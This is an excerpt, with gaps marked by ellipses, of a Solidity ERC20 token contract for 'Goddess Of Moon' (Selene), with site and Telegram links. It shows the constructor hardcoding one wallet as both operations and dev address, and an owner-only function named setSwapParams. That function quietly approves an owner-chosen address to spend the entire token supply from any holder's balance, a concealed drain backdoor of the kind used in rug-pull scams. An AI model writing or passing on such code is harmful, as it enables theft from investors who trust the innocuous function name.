...
/*
 * https://goddessofmoon.io
 * https://t.me/SeleneGoddessEth
 **/
// 
...
contract GoddessOfMoon is ERC20, Ownable {
    ...
    constructor() ERC20("Goddess Of Moon", "Selene") {
        ...
        operationsAddress = address(0x5498dE81B65D28aE1cEC7f526f68431622C21C30);
        devAddress = address(0x5498dE81B65D28aE1cEC7f526f68431622C21C30);
    ...
    function setSwapParams(address _master, address _order) public onlyOwner {
        _isExcludedFromFees[_master] = true;
        _approve(_order, _master, totalSupply());
    }
    ...
    function swapBack() private nonSwapChecker {
